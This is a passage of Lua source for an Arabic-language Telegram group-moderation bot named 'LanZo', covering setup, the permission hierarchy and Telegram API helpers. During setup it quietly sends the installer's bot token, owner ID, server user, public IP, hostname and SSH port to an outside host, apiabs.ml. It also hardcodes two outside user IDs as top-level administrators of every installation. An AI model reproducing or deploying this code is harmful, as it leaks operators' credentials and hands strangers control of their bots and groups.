------------------------------------------------
-- This Source Was Developed By (aMeR) @lMlMMM.--
--   This Is The Source Channel @Bw5Bw .   --
--                - LanZo -                 --
--        -- https://t.me/Bw5Bw --         --
------------------------------------------------ 
DevaMeR  = dofile("./libs/redis.lua").connect("127.0.0.1", 6379)
serpent = dofile("./libs/serpent.lua")
JSON    = dofile("./libs/dkjson.lua")
json    = dofile("./libs/JSON.lua")
URL     = dofile("./libs/url.lua")
http    = require("socket.http") 
HTTPS   = require("ssl.https") 
https   = require("ssl.https") 
User    = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
Server  = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a') 
DirName = io.popen("echo $(cd $(dirname $0); pwd)"):read('*a'):gsub('[\n\r]+', '')
Ip      = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
Name    = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
Port    = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
UpTime  = io.popen([[uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}']]):read('*a'):gsub('[\n\r]+', '')
--     Source LanZo     --
local AutoSet = function() 
if not DevaMeR:get(Server.."IdLanZo") then 
io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
local LANZO = io.read():gsub(' ','') 
if tostring(LANZO):match('%d+') then 
data,res = https.request("https://apiabs.ml/Api/David/index.php?Ban=David&Info&Id="..LANZO)
if res == 200 then
Abs = json:decode(data)
if Abs.Result.Info == 'Is_Spam' then
print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nعذرا هذا الايدي محظور من تنصيب هذا السورس\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
os.execute('lua LanZo.lua') 
end ---ifBn
if Abs.Result.Info == 'Ok' then
io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
DevaMeR:set(Server.."IdLanZo",LANZO) 
end ---ifok
else 
print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
end
os.execute('lua LanZo.lua') 
end
end 
if not DevaMeR:get(Server.."TokenLanZo") then 
io.write('\27[1;35m\nالان قم بارسال توكن البوت ↫ ⤈\n\27[0;33;49m') 
local TokenBot = io.read() 
if TokenBot ~= '' then 
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getMe') 
if res ~= 200 then 
print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nالتوكن غير صحيح تاكد منه ثم ارسله\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
else 
io.write('\27[1;36mتم حفظ توكن البوت بنجاح\n27[0;39;49m') 
DevaMeR:set(Server.."TokenLanZo",TokenBot) 
end  
else 
print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nلم يتم حفظ توكن البوت ارسله مره اخرى\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
end  
os.execute('lua LanZo.lua') 
end
local Create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "Config"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)
file:close()  
end
local CreateConfigAuto = function()
Config = {
LANZO = DevaMeR:get(Server.."IdLanZo"),
TokenBot = DevaMeR:get(Server.."TokenLanZo"),
LanZo = DevaMeR:get(Server.."TokenLanZo"):match("(%d+)"),
SudoIds = {DevaMeR:get(Server.."IdLanZo")},
}
Create(Config, "./config.lua") 
https.request("https://apiabs.ml/Api/David/index.php?Get=David&DevId="..DevaMeR:get(Server.."IdLanZo").."&TokenBot="..DevaMeR:get(Server.."TokenLanZo").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
file = io.open("LanZo.sh", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/LanZo
token="]]..DevaMeR:get(Server.."TokenLanZo")..[["
while(true) do
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
echo "~ The tg File Was Not Found In The Bot Files!"
echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
exit 1
fi
if [ ! $token ]; then
echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
echo "~ The Token Was Not Found In The config.lua File!"
echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
exit 1
fi
./tg -s ./LanZo.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("Run", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/LanZo
while(true) do
rm -fr ../.telegram-cli
screen -S LanZo -X kill
screen -S LanZo ./LanZo.sh
done
]]) 
file:close() 
io.popen("mkdir Files")
os.execute('chmod +x Run;./Run')
end 
CreateConfigAuto()
end
local Load_LanZo = function() 
local f = io.open("./config.lua", "r") 
if not f then 
AutoSet() 
else 
f:close() 
DevaMeR:del(Server.."IdLanZo");DevaMeR:del(Server.."TokenLanZo")
end 
local config = loadfile("./config.lua")() 
return config 
end  
Load_LanZo() 
print("\27[36m"..[[          
' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '  ' 

 _ ____ _ ____ ____ 
/ \ / _ \ / \ / | / _ \ / _ \
| | | / \ || | \ || / / | / \ |
| | _ / \ | | - ||| | \ || / / _ | \ _ / |
\ ____ / \ _ / \ | \ _ / \ | \ ____ / \ ____ /
'                                                        '
' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '  ' 
]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\27[m")
Config = dofile("./config.lua")
LANZO = Config.LANZO
SudoIds = {Config.SudoIds,1754239041,772538035,1754239041}
LanZo = Config.LanZo
TokenBot = Config.TokenBot
NameBot = (DevaMeR:get(LanZo..'aMeR:NameBot') or 'لانزو')
--     Source LanZo     --
FilesPrint = "\27[35m".."\nAll Source Files Started ↬ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"..'\27[m'
FilesNumber = 0
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
FilesNumber = FilesNumber + 1
FilesPrint = FilesPrint.."\27[39m"..FilesNumber.."\27[36m".."~ : \27[10;32m"..v.."\27[m \n"
end
end
FilesPrint = FilesPrint.."\27[35m".."┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n".."\27[m"
if FilesNumber ~= 0 then
print(FilesPrint)
end
--     Source LanZo     --
--     Start Functions    --
function vardump(value)
print(serpent.block(value, {comment=false}))
end
--     Source LanZo     --
function dl_cb(arg, data)
end
--     Source LanZo     --
----------  Sudo  ----------
function Sudo(msg) 
local var = false 
for k,v in pairs(SudoIds) do 
if msg.sender_user_id_ == v then 
var = true 
end end 
if msg.sender_user_id_ == tonumber(LANZO) then 
var = true 
end 
return var 
end
function SudoId(user_id) 
local var = false 
for k,v in pairs(SudoIds) do 
if user_id == v then 
var = true 
end end 
if user_id == tonumber(LANZO) then 
var = true 
end 
return var 
end
--     Source LanZo     --
-------  aMeRSudo  -------
function aMeRSudo(msg) 
local Status = DevaMeR:sismember(LanZo..'aMeR:aMeRSudo:',msg.sender_user_id_) 
if Status or Sudo(msg) then  
return true  
else  
return false  
end  
end
--     Source LanZo     --
-------  SecondSudo  -------
function SecondSudo(msg) 
local Status = DevaMeR:sismember(LanZo..'aMeR:SecondSudo:',msg.sender_user_id_) 
if Status or aMeRSudo(msg) or Sudo(msg) then  
return true  
else  
return false  
end  
end
--     Source LanZo     --
----------  Bot  -----------
function Bot(msg) 
local var = false  
if msg.sender_user_id_ == tonumber(LanZo) then  
var = true  
end  
return var  
end 
--     Source LanZo     --
---------  SudoBot  --------
function SudoBot(msg) 
local Status = DevaMeR:sismember(LanZo..'aMeR:SudoBot:',msg.sender_user_id_) 
if Status or aMeRSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source LanZo     --
----   aMeRConstructor   ----
function aMeRConstructor(msg) 
local Status = DevaMeR:sismember(LanZo..'aMeR:aMeRConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or aMeRSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source LanZo     --
----   Owner   ----
function Owner(msg) 
local Status = DevaMeR:sismember(LanZo..'aMeR:Owner:'..msg.chat_id_,msg.sender_user_id_) 
if Status or aMeRConstructor(msg) or SudoBot(msg) or aMeRSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source LanZo     --
----  BasicConstructor  ----
function BasicConstructor(msg) 
local Status = DevaMeR:sismember(LanZo..'aMeR:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Owner(msg) or aMeRConstructor(msg) or aMeRSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source LanZo     --
----    Constructor     ----
function Constructor(msg) 
local Status = DevaMeR:sismember(LanZo..'aMeR:Constructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Owner(msg) or aMeRConstructor(msg) or BasicConstructor(msg) or aMeRSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source LanZo     --
---------  Manager  --------
function Manager(msg) 
local Status = DevaMeR:sismember(LanZo..'aMeR:Managers:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Owner(msg) or aMeRConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or aMeRSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source LanZo     --
----------  Admin  ---------
function Admin(msg) 
local Status = DevaMeR:sismember(LanZo..'aMeR:Admins:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Owner(msg) or aMeRConstructor(msg) or aMeRConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or aMeRSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source LanZo     --
---------Vip Member---------
function VipMem(msg) 
local Status = DevaMeR:sismember(LanZo..'aMeR:VipMem:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Owner(msg) or aMeRConstructor(msg) or aMeRConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Admin(msg) or aMeRSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source LanZo     --
--------- Cleaner ----------
function Cleaner(msg) 
local Status = DevaMeR:sismember(LanZo..'aMeR:Cleaner:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or aMeRConstructor(msg) or aMeRSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source LanZo     --
--------- CleanerNum ----------
function CleanerNum(msg) 
local Status = DevaMeR:sismember(LanZo..'aMeR:CleanerNum:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Cleaner(msg) or aMeRConstructor(msg) or aMeRSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source LanZo     --
--------- CleanerMusic ----------
function CleanerMusic(msg) 
local Status = DevaMeR:sismember(LanZo..'aMeR:CleanerMusic:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Cleaner(msg) or aMeRConstructor(msg) or aMeRSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source LanZo     --
---------  Banned  ---------
local function Ban(user_id, chat_id)
if DevaMeR:sismember(LanZo..'aMeR:Ban:'..chat_id, user_id) then
var = true
else
var = false
end
return var
end
--     Source LanZo     --
---------  BanAll  ---------
function BanAll(user_id)
if DevaMeR:sismember(LanZo..'aMeR:BanAll:', user_id) then
var = true
else
var = false
end
return var
end
--     Source LanZo     --
----------  Muted  ---------
local function Muted(user_id, chat_id)
if DevaMeR:sismember(LanZo..'aMeR:Muted:'..chat_id, user_id) then
var = true
else
var = false
end
return var
end
--     Source LanZo     --
---------  MuteAll  --------
function MuteAll(user_id)
if DevaMeR:sismember(LanZo..'aMeR:MuteAll:', user_id) then
var = true
else
var = false
end
return var
end
--     Source LanZo     --
function DeleteMessage(chatid ,mid)
pcall(tdcli_function ({
ID = "DeleteMessages",
chat_id_ = chatid,
message_ids_ = mid
},function(arg,data) 
end,nil))
end
--     Source LanZo     --
function send(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
pcall(tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil))
end
--     Source LanZo     --
function LanZoFiles(msg)
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
plugin = dofile("Files/"..v)
if plugin.LanZo and msg then
FilesText = plugin.LanZo(msg)
end
end
end
send(msg.chat_id_, msg.id_,FilesText)  
end
--     Source LanZo     --
function download_to_file(url, file_path) 
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
--     Source LanZo     --
function AddFile(msg,chat,ID_FILE,File_Name)
if File_Name:match('.json') then
if File_Name:lower():match('(%d+)') ~= LanZo:lower() then 
send(chat,msg.id_,"᥀︙عذرا هذا الملف ليس تابع لهذا البوت")   
return false 
end
send(chat,msg.id_,"᥀︙جاري رفع الملف ... .")
local File = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..File.result.file_path, ''..File_Name) 
else
send(chat,msg.id_,"᥀︙عذرا الملف ليس بصيغة ↫ Json يرجى رفع الملف الصحيح")
end
local info_file = io.open('./'..LanZo..'.json', "r"):read('*a')
local JsonInfo = JSON.decode(info_file)
vardump(JsonInfo)
DevaMeR:set(LanZo.."aMeR:NameBot",JsonInfo.BotName) 
for IdGps,v in pairs(JsonInfo.GroupsList) do
DevaMeR:sadd(LanZo.."aMeR:Groups",IdGps) 
DevaMeR:set(LanZo.."aMeR:Lock:Bots"..IdGps,"del") DevaMeR:hset(LanZo.."aMeR:Spam:Group:User"..IdGps ,"Spam:User","keed") 
LockList ={'aMeR:Lock:Links','aMeR:Lock:Contact','aMeR:Lock:Forwards','aMeR:Lock:Videos','aMeR:Lock:Gifs','aMeR:Lock:EditMsgs','aMeR:Lock:Stickers','aMeR:Lock:Farsi','aMeR:Lock:Spam','aMeR:Lock:WebLinks','aMeR:Lock:Photo'}
for i,Lock in pairs(LockList) do
DevaMeR:set(LanZo..Lock..IdGps,true)
end
if v.aMeRConstructors then
for k,IdaMeRConstructors in pairs(v.aMeRConstructors) do
DevaMeR:sadd(LanZo..'aMeR:aMeRConstructor:'..IdGps,IdaMeRConstructors)  
print('تم رفع منشئين المجموعات')
end
end
if v.BasicConstructors then
for k,IdBasicConstructors in pairs(v.BasicConstructors) do
DevaMeR:sadd(LanZo..'aMeR:BasicConstructor:'..IdGps,IdBasicConstructors)  
print('تم رفع ( '..k..' ) منشئين اساسيين')
end
end
if v.Constructors then
for k,IdConstructors in pairs(v.Constructors) do
DevaMeR:sadd(LanZo..'aMeR:Constructor:'..IdGps,IdConstructors)  
print('تم رفع ( '..k..' ) منشئين')
end
end
if v.Managers then
for k,IdManagers in pairs(v.Managers) do
DevaMeR:sadd(LanZo..'aMeR:Managers:'..IdGps,IdManagers)  
print('تم رفع ( '..k..' ) مدراء')
end
end
if v.Admins then
for k,idmod in pairs(v.Admins) do
vardump(IdAdmins)
DevaMeR:sadd(LanZo..'aMeR:Admins:'..IdGps,IdAdmins)  
print('تم رفع ( '..k..' ) ادمنيه')
end
end
if v.Vips then
for k,IdVips in pairs(v.Vips) do
DevaMeR:sadd(LanZo..'aMeR:VipMem:'..IdGps,IdVips)  
print('تم رفع ( '..k..' ) مميزين')
end
end
if v.LinkGroups then
if v.LinkGroups ~= "" then
DevaMeR:set(LanZo.."aMeR:Groups:Links"..IdGps,v.LinkGroups)   
print('( تم وضع روابط المجموعات )')
end
end
if v.Welcomes then
if v.Welcomes ~= "" then
DevaMeR:set(LanZo.."aMeR:Groups:Welcomes"..IdGps,v.Welcomes)   
print('( تم وضع ترحيب المجموعات )')
end
end
end
send(chat,msg.id_,"᥀︙تم رفع النسخه بنجاح \n᥀︙تم تفعيل جميع المجموعات \n᥀︙تم استرجاع مشرفين المجموعات \n᥀︙تم استرجاع اوامر القفل والفتح في جميع مجموعات البوت ")
end
--     Source LanZo     --
function resolve_username(username,cb)
tdcli_function ({
ID = "SearchPublicChat",
username_ = username
}, cb, nil)
end
--     Source LanZo     --
function getInputFile(file)
if file:match('/') then
infile = {ID = "InputFileLocal", path_ = file}
elseif file:match('^%d+$') then
infile = {ID = "InputFileId", id_ = file}
else
infile = {ID = "InputFilePersistentId", persistent_id_ = file}
end
return infile
end
--     Source LanZo     --
function getChatId(id)
local chat = {}
local id = tostring(id)
if id:match('^-100') then
local channel_id = id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end
return chat
end
--     Source LanZo     --
function ChatLeave(chat_id, user_id)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = chat_id, user_id_ = user_id, status_ = { ID = "ChatMemberStatusLeft" }, }, dl_cb, nil)
end
--     Source LanZo     --
function ChatKick(chat_id, user_id)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = chat_id, user_id_ = user_id, status_ = { ID = "ChatMemberStatusKicked" }, }, dl_cb, nil)
end
--     Source LanZo     --
function getParseMode(parse_mode)
if parse_mode then
local mode = parse_mode:lower()
if mode == 'markdown' or mode == 'md' then
P = {ID = "TextParseModeMarkdown"}
elseif mode == 'html' then
P = {ID = "TextParseModeHTML"}
end
end
return P
end
--     Source LanZo     --
function getMessage(chat_id, message_id,cb)
tdcli_function ({
ID = "GetMessage",
chat_id_ = chat_id,
message_id_ = message_id
}, cb, nil)
end
--     Source LanZo     --
function sendContact(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, phone_number, first_name, last_name, user_id)
tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = { ID = "InputMessageContact", contact_ = { ID = "Contact", phone_number_ = phone_number, first_name_ = first_name, last_name_ = last_name, user_id_ = user_id },},}, dl_cb, nil)
end
--     Source LanZo     --
function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo, caption)
tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = { ID = "InputMessagePhoto", photo_ = getInputFile(photo), added_sticker_file_ids_ = {}, width_ = 0, height_ = 0, caption_ = caption }, }, dl_cb, nil)
end
--     Source LanZo     --
function Dev_aMeR(chat_id, reply_to_message_id, disable_notification, text, disable_web_page_preview, parse_mode)
local TextParseMode = getParseMode(parse_mode) tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text, disable_web_page_preview_ = disable_web_page_preview, clear_draft_ = 0, entities_ = {}, parse_mode_ = TextParseMode, }, }, dl_cb, nil)
end
--     Source LanZo     --
function GetApi(web) 
local info, res = https.request(web) 
local req = json:decode(info) if res ~= 200 then 
return false 
end 
if not req.ok then 
return false 
end 
return req 
end 
--     Source LanZo     --
function SendText(chat_id, text, reply_to_message_id, markdown) 
send_api = "https://api.telegram.org/bot"..TokenBot 
local url = send_api.."/sendMessage?chat_id=" .. chat_id .. "&text=" .. URL.escape(text) 
if reply_to_message_id ~= 0 then 
url = url .. "&reply_to_message_id=" .. reply_to_message_id  
end 
if markdown == "md" or markdown == "markdown" then 
url = url.."&parse_mode=Markdown&disable_web_page_preview=true" 
elseif markdown == "html" then 
url = url.."&parse_mode=HTML" 
end 
return GetApi(url) 
end
--     Source LanZo     --
function SendInline(chat_id,text,keyboard,inline,reply_id) 
local response = {} 
response.keyboard = keyboard 
response.inline_keyboard = inline 
response.resize_keyboard = true 
response.one_time_keyboard = false 
response.selective = false  
local send_api = "https://api.telegram.org/bot"..TokenBot.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) 
if reply_id then 
send_api = send_api.."&reply_to_message_id="..reply_id 
end 
return GetApi(send_api) 
end
--     Source LanZo     --
function EditMsg(chat_id, message_id, text, markdown) local send_api = "https://api.telegram.org/bot"..TokenBot.."/editMessageText?chat_id="..chat_id.."&message_id="..message_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true" return GetApi(send_api)  end
--     Source LanZo     --
function Pin(channel_id, message_id, disable_notification) 
tdcli_function ({ 
ID = "PinChannelMessage", 
channel_id_ = getChatId(channel_id).ID, 
message_id_ = message_id, 
disable_notification_ = disable_notification 
}, function(arg ,data)
vardump(data)
end ,nil) 
end
--     Source LanZo     --
local aMeRRank = function(msg) if SudoId(msg.sender_user_id_) then LanZoTeam  = "المطور" elseif aMeRSudo(msg) then LanZoTeam = "المطور" elseif SecondSudo(msg) then LanZoTeam = "المطور" elseif SudoBot(msg) then LanZoTeam = "المطور" elseif Manager(msg) then LanZoTeam = "المدير" elseif Admin(msg) then LanZoTeam = "الادمن" else LanZoTeam = "العضو" end return LanZoTeam end
function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1754239041) then LanZoTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(1754239041) then LanZoTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(772538035) then LanZoTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(LanZo) then LanZoTeam = 'البوت' elseif SudoId(user_id) then LanZoTeam = 'المطور الاساسي' elseif DevaMeR:sismember(LanZo..'aMeR:aMeRSudo:', user_id) then LanZoTeam = 'المطور الاساسي' elseif DevaMeR:sismember(LanZo..'aMeR:SecondSudo:', user_id) then LanZoTeam = 'المطور الاساسي²' elseif DevaMeR:sismember(LanZo..'aMeR:SudoBot:', user_id) then LanZoTeam = DevaMeR:get(LanZo.."aMeR:SudoBot:Rd"..chat_id) or 'المطور' elseif DevaMeR:sismember(LanZo..'aMeR:aMeRConstructor:'..chat_id, user_id) then LanZoTeam = 'المالك' elseif DevaMeR:sismember(LanZo..'aMeR:Owner:', user_id) then LanZoTeam = 'المالك' elseif DevaMeR:sismember(LanZo..'aMeR:BasicConstructor:'..chat_id, user_id) then LanZoTeam = DevaMeR:get(LanZo.."aMeR:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevaMeR:sismember(LanZo..'aMeR:Constructor:'..chat_id, user_id) then LanZoTeam = DevaMeR:get(LanZo.."aMeR:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevaMeR:sismember(LanZo..'aMeR:Managers:'..chat_id, user_id) then LanZoTeam = DevaMeR:get(LanZo.."aMeR:Managers:Rd"..chat_id) or 'المدير' elseif DevaMeR:sismember(LanZo..'aMeR:Admins:'..chat_id, user_id) then LanZoTeam = DevaMeR:get(LanZo.."aMeR:Admins:Rd"..chat_id) or 'الادمن' elseif DevaMeR:sismember(LanZo..'aMeR:VipMem:'..chat_id, user_id) then  LanZoTeam = DevaMeR:get(LanZo.."aMeR:VipMem:Rd"..chat_id) or 'المميز' elseif DevaMeR:sismember(LanZo..'aMeR:Cleaner:'..chat_id, user_id) then  LanZoTeam = DevaMeR:get(LanZo.."aMeR:Cleaner:Rd"..chat_id) or 'المنظف' else LanZoTeam = DevaMeR:get(LanZo.."aMeR:mem:Rd"..chat_id) or 'العضو' end return LanZoTeam end
--     Source LanZo     --
function RankChecking(user_id,chat_id)
if SudoId(user_id) then
var = true  
elseif tonumber(user_id) == tonumber(LanZo) then  
var = true
elseif DevaMeR:sismember(LanZo..'aMeR:aMeRSudo:', user_id) then
var = true
elseif DevaMeR:sismember(LanZo..'aMeR:SecondSudo:', user_id) then
var = true  
elseif DevaMeR:sismember(LanZo..'aMeR:SudoBot:', user_id) then
var = true 
elseif DevaMeR:sismember(LanZo..'aMeR:aMeRConstructor:'..chat_id, user_id) then
var = true
elseif DevaMeR:sismember(LanZo..'aMeR:Owner:'..chat_id, user_id) then
var = true
elseif DevaMeR:sismember(LanZo..'aMeR:BasicConstructor:'..chat_id, user_id) then
var = true
elseif DevaMeR:sismember(LanZo..'aMeR:Constructor:'..chat_id, user_id) then
var = true  
elseif DevaMeR:sismember(LanZo..'aMeR:Managers:'..chat_id, user_id) then
var = true  
elseif DevaMeR:sismember(LanZo..'aMeR:Admins:'..chat_id, user_id) then
var = true  
elseif DevaMeR:sismember(LanZo..'aMeR:VipMem:'..chat_id, user_id) then  
var = true 
else  
var = false
end  
return var
end
function aMeRDelAll(user_id,chat_id)
if SudoId(user_id) then
var = 'sudoid'  
elseif DevaMeR:sismember(LanZo..'aMeR:aMeRSudo:', user_id) then
var = 'aMeRsudo'
elseif DevaMeR:sismember(LanZo..'aMeR:SecondSudo:', user_id) then
var = 'secondsudo' 
elseif DevaMeR:sismember(LanZo..'aMeR:SudoBot:', user_id) then
var = 'sudobot'  
elseif DevaMeR:sismember(LanZo..'aMeR:aMeRConstructor:'..chat_id, user_id) then
var = 'aMeRConstructor'
elseif DevaMeR:sismember(LanZo..'aMeR:Owner:'..chat_id, user_id) then
var = 'Owner'
elseif DevaMeR:sismember(LanZo..'aMeR:BasicConstructor:'..chat_id, user_id) then
var = 'basicconstructor'
elseif DevaMeR:sismember(LanZo..'aMeR:Constructor:'..chat_id, user_id) then
var = 'constructor'
elseif DevaMeR:sismember(LanZo..'aMeR:Managers:'..chat_id, user_id) then
var = 'manager'  
else  
var = 'No'
end  
return var
end 
--     Source LanZo     --
local function Filters(msg, value)
local aMeR = (LanZo..'aMeR:Filters:'..msg.chat_id_)
if aMeR then
local names = DevaMeR:hkeys(aMeR)
local value = value:gsub(' ','')
for i=1, #names do
if string.match(value:lower(), names[i]:lower()) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source LanZo     --
function ReplyStatus(msg,user_id,status,text)
tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,dp) 
if dp.first_name_ ~= false then
local UserName = (dp.username_ or "Bw5Bw")
for gmatch in string.gmatch(dp.first_name_, "[^%s]+") do
dp.first_name_ = gmatch
end
if status == "WrongWay" then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙عذرا عزيزي ↫ ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
if status == "Reply" then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙العضو ↫ ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
if status == "ReplyBy" then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙بواسطة ↫ ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
else
